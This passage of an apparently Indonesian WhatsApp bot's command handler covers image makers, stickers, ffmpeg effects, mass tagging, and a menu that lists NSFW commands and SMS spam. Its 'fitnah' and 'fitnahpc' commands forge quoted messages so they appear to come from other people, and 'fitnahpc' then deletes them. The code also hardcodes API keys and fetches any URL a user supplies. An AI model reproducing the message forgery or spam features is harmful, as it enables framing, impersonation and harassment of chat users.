          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/wanted?picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "deltrash":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/deltrash?imgurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "squidrip":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/rip?picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;

      case "wasted":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          //  console.log(ted)
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/wasted?imgurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        } /*else {
                                                                 reply('Jangan tambah kan apapun pada command')
                                                                   }*/
        break;
      //RANDOM IMAGE
     /* case "waifu":
      case "loli":
      case "husbu":
      case "milf":
      case "cosplay":
      case "naruto":
      case "wibu":
      case "aeshtetic":
      case "wallpaperanime":
        let wipu = await fetchJson(
          `https://api.dhnjing.xyz/search/pinterest/image?query=${command}`
        );
        gmbr = wipu.result[Math.floor(Math.random() * wipu.result.lenght)];
        fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(gmbr.orig.url));
        buttons = [
          {
            buttonId: `${prefix + command}`,
            buttonText: { displayText: `➡️Next` },
            type: 1,
          },
        ];
        imageMsg = (
          await syaa.prepareMessage(
            from,
            fs.readFileSync(`./${sender}.jpeg`),
            "imageMessage",
            { thumbnail: Buffer.alloc(0) }
          )
        ).message.imageMessage;
        buttonsMessage = {
          footerText: "Jangan Lupa Donasi Ya Kak ☕",
          imageMessage: imageMsg,
          contentText: `klik Next untuk ke gambar selanjut nya`,
          buttons,
          headerType: 4,
        };
        prep = await syaa.prepareMessageFromContent(
          from,
          { buttonsMessage },
          { quoted: mek }
        );
        syaa.relayWAMessage(prep);
        fs.unlinkSync(`./${sender}.jpeg`);
        break;*/
      case "loli":
      case "quotes":
      case "kucing":
      case "anjing":
      case "minato":
      case "kakashi":
      case "boruto":
      case "sarada":
      case "mitsuki":
      case "sasuke":
      case "sakura":
      case "squidward":
      case "spongebob":
      case "sudiro":
      case "itachi":
      case "cecan":
      case "cogan":
      case "memeindo":
      case "polosanmeme":
      case "megumin":
      case "waifu":
      case "patrick":
      case "husbu":
      case "milf":
      case "aesthetic":
      case "cosplay":
      case "naruto":
      case "wibu":
      case "aeshtetic":
      case "wallpaperanime":
        sendButMessage(from, `Random Image by @𝕀𝕂𝕐`, `press the button below`, [
          {
            buttonId: `/pinterest ${command}`,
            buttonText: {
              displayText: `${command}`,
            },
            type: 1,
          },
        ]);
        break
case "bis":
  sendButMessage(from, `Random Image by @𝕀𝕂𝕐`, `press the button below`, [
          {
            buttonId: `/pinterest sudiro`,
            buttonText: {
              displayText: `${command}`,
            },
            type: 1,
          },
        ]);
        break
      case "caripesan":
        case "smsg":
        if (!q) return reply("pesannya apa bang?");
        let v = await syaa.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await syaa.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
        case "lirik":
          if (!q) return reply("lagu apa?");
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `*Judul Lagu :* ${teks}\n*Lirik Lagu :* ${res[0].result}`
reply(lirik)
})
break
      case "liri":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        syaa.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara syaa`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await syaa.sendMessage(from, li, image, { quoted: mek });
        break;
      case "pinterest":
        if (!q) return reply("gambar apa?");
        reply("Sedang mencari Imagenya🔍")
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
        await syaa.sendMessage(from, di, image, { quoted: mek })
        break;
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
        case "menuall1":
            if (isBanned) return reply(mess.ban)
        var menu = `${ucapanWaktu} kak *${pushname}*
╔═════════════════════༻					
║*「 Islami 」*
║•listsurah
║•asmaulhusna
║•alquran no_surah
║•alquran no_surah/no_ayat
║•alquran no_surah/no_ayat1-no_ayat2
║•alquranaudio no_surah
║•alquranaudio no_surah/no_ayat
║•kisahnabi nama_nabi
║•jadwalsholat daerah
╚══════════════════════༻
╔════════════════༻	
║*「 Downloader 」*
║•ytsearch query
║•ytplay query
║•ytmp3 url_video
║•ytmp4 url_video
║•tiktoknowm url_video
║•tiktokmusic url_video
║•igdl url_post
║•fbdl url_video
║•jooxplay query
║•spotify url_music
║•spotifysearch query
║•pinterest query
║•pinterestdl url_pinterest
║•pixiv query
║•pixivdl url_pixiv
║•zippyshare url_zippyshare
║•telesticker url_pack
╚════════════════༻
╔════════════════༻	
║*「 Movie & Story 」*
║•drakorongoing
║•lk21 query
║•wattpad url_wattpad
║•wattpadsearch query
║•cerpen
║•ceritahoror
╚════════════════༻
╔════════════════༻	
║*「 Searching 」*
║•shopee query
║•google query
║•gimage query
║•gimage2 query
║•konachan query
║•playstore query
║•stickerwa query
║•wallpapersearch query
║•wallpapersearch2 query
╚════════════════༻
╔══════════════༻	
║*「 Random Text 」*
║•quotes
║•quotesdilan
║•quotesanime
║•quotesimage
║•faktaunik
║•katabijak
║•pantun
║•bucin
║•randomnama
╚══════════════༻
╔════════════════༻	
║*「 AniManga 」*
║•wait
║•manga query
║•anime query
║•character query
║•kusonime url_kusonime
║•kusonimesearch query
║•otakudesu url_otakudesu
║•otakudesusearch query
║•nhentai kode_bom
║•nhentaipdf kode_bom
║•nhentaisearch query
║•nekopoi url
║•nekopoisearch query
╚════════════════༻
╔══════════════════༻	
║*「 Information 」*
║•kbbi
║•brainly2
║•jarak
║•urbandictionary
║•jadwaltv channel
║•jadwaltvnow
║•jadwalbola
║•qrreader
║•heroml hero_name
║•mlstalk id/server
║•genshin character
║•wikipedia query
║•translate kode_negara text
║•brainly query
║•newsinfo
║•cnnindonesia
║•cnnnasional
║•cnninternasional
║•infogempa
║•lirik query
║•cuaca daerah
║•kodepos query
║•indbeasiswa
║•hoax
║•nsfwcheck
║•ocr
╚═════════════════════༻
╔══════════════༻	
║*「 Entertainment 」*
║•asupan
║•wancak
║•tebakgambar
║•canceltebakgambar
║•akinator
║•cancelakinator
╚══════════════༻
╔══════════༻	
║*「 Creator 」*
║•ttp text
║•ttp2 text
║•ttp3 text
║•ttp4 text
║•ttpblue text
║•ttpyellow text
║•ttpgreen text
║•attp text
║•smoji emoji
║•fakedonald text
║•ktpmaker
╚═══════════༻
╔══════════════════༻	
║*「 Primbon 」*
║•artinama name
║•jodoh name1 & name2 
║•weton tanggal bulan tahun
║•jadian tanggal bulan tahun
║•tebakumur name
╚════════════════༻
╔════════════༻	
║*「 Other 」*
║•ssweb link
║•ssweb2 link
║•shortlink link
║•spamsms nomor
╚════════════════༻
╔════════════════༻	
║*「 Text Pro Me 」*
║•blackpink text
║•neon text
║•greenneon text
║•advanceglow text
║•futureneon text
║•sandwriting text
║•sandsummer text
║•sandengraved text
║•metaldark text
║•neonlight text
║•holographic text
║•text1917 text
║•minion text
║•deluxesilver text
║•newyearcard text
║•bloodfrosted text
║•halloween text
║•jokerlogo text
║•fireworksparkle text
║•natureleaves text
║•bokeh text
║•toxic text
║•strawberry text
║•box3d text
║•roadwarning text
║•breakwall text
║•icecold text
║•luxury text
║•cloud text
║•summersand text
║•horrorblood text
║•thunder text
║•pornhub text1 text2
║•glitch text1 text2
║•avenger text1 text2
║•space text1 text2
║•ninjalogo text1 text2
║•marvelstudio text1 text2
║•lionlogo text1 text2
║•wolflogo text1 text2
║•steel3d text1 text2
║•wallgravity text1 text2
╚════════════════༻
╔═════════════════════༻	
║*「 Photo Oxy 」*
║•shadow text
║•cup text
║•cup1 text
║•romance text
║•smoke text
║•burnpaper text
║•lovemessage text
║•undergrass text
║•love text
║•coffe text
║•woodheart text
║•woodenboard text
║•summer3d text
║•wolfmetal text
║•nature3d text
║•underwater text
║•golderrose text
║•summernature text
║•letterleaves text
║•glowingneon text
║•fallleaves text
║•avatardota text
║•flamming text
║•harrypotter text
║•carvedwood text
║•tiktok text1 text2
║•arcade8bit text1 text2
║•battlefield4 text1 text2
║•pubg text1 text2
╚════════════════༻
╔═════════════════════༻	
║*「 Ephoto 360 」*
║•wetglass text
║•multicolor3d text
║•watercolor text
║•luxurygold text
║•galaxywallpaper text
║•lighttext text
║•beautifulflower text
║•puppycute text
║•royaltext text
║•heartshaped text
║•birthdaycake text
║•galaxystyle text
║•hologram3d text
║•greenneon text
║•glossychrome text
║•greenbush text
║•metallogo text
║•noeltext text
║•glittergold text
║•textcake text
║•starsnight text
║•wooden3d text
║•textbyname text
║•writegalacy text
║•galaxybat text
║•snow3d text
║•birthdayday text
║•freefire text
╚════════════════༻
╔═════════════════════༻	
║*「 Random Image  」*
║•art
║•bts
║•exo
║•elf
║•neko
║•waifu
║•shota
║•husbu
║•sagiri
║•shinobu
║•megumin
║•wallnime
║•chiisaihentai
║•trap
║•blowjob
║•yaoi
║•ecchi
║•hentai
║•ahegao
║•hololewd
║•sideoppai
║•animefeets
║•animebooty
║•animethighss
║•hentaiparadise
║•animearmpits
║•hentaifemdom
║•lewdanimegirls
║•biganimetiddies
║•animebellybutton
║•hentai4everyone
║•bj
║•ero
║•cum
║•feet
║•yuri
║•trap
║•lewd
║•feed
║•eron
║•solo
║•gasm
║•poke
║•anal
║•holo
║•tits
║•kuni
║•kiss
║•erok
║•smug
║•baka
║•solog
║•feetg
║•lewdk
║•waifu
║•pussy
║•femdom
║•cuddle
║•hentai
║•eroyuri
║•cum_jpg
║•blowjob
║•erofeet
║•holoero
║•classic
║•erokemo
║•fox_girl
║•futanari
║•lewdkemo
║•wallpaper
║•pussy_jpg
║•kemonomimi
║•nsfw_avatar
║•ngif
║•nsfw_neko_gif
║•random_hentai_gif
╚════════════════༻
*_THANKS BUAT_*
===================
- _ORTU_

 *INFO BOT*
• Prefix : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
• Runtime : ${runtime(process.uptime())}
• Hit Today : ${hit_today.length} Hit
• Total Hit : ${totalhit} Hit
• Total Chat : ${totalchat.length} Chat

`;
        sendButImage(from, menu, "by ikyyyyy 🗿", thumb, [
          {
            buttonId: `${prefix}donasi`,
            buttonText: {
              displayText: `DONASI💰`,
            },
            type: 1,
          },
                    {
            buttonId: `${prefix}menuall1`,
            buttonText: {
              displayText: `MENU ALL1`,
            },
            type: 1,
          },
        ]);

        break;
      case "on":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        offline = false;
        reply(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
        reply(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        reply(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            reply(bu);
          });
        break;
      case "kontag":
        
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        syaa.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        syaa.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await syaa.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await syaa.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
      case "tomp3":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          syaa.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            syaa.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "slow":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            syaa.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          syaa.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;

      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                syaa.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
      case "kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        syaa.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
      case "take":
      case "colong":
        if (!isQuotedSticker) return reply("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `Arasyaaa`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `@𝕀𝕂𝕐`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, syaa, mek, from);
        break;
        
        
      case "stikerwm":
      case "stickerwm":
      case "swm":
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              syaa.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                syaa.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              syaa.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                syaa.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;
        case '🎺': 
imkyntil = fs.readFileSync("./sara/vidio1.mp4")
syaa.sendMessage(from, imkyntil, MessageType.video, {quoted: mek, caption: `CzbNih`})
break
case '🎺🎺': 
imkyntil = fs.readFileSync("./sara/vidio2.mp4")
syaa.sendMessage(from, imkyntil, MessageType.video, {quoted: mek, caption: `CzbNih`})
break
case 'th':
const hideTag = async function(from, text){
	let anu = await syaa.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
		ane.push(i.jid)
	}
	syaa.sendMessage(from, text, MessageType.text, {contextInfo: {"mentionedJid": ane}})
}
			  if (!mek.key.fromMe) return reply(mess.me)
for (let a of groupMembers) {
hideTag(from,`@${a.jid.split('@')[0]}`,'conversation',{contextInfo:{mentionedJid:[a.jid]}})
}
break;        
        case "spamsw":
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					syaa.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
      case "upswteks":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
        if (!q) return reply("Isi teksnya!");
        syaa.sendMessage("status@broadcast", `${q}`, extendedText);
        fakegroup(`Sukses Up story wea teks ${q}`);
        break;
        case "upswlokasi":
          if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    syaa.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
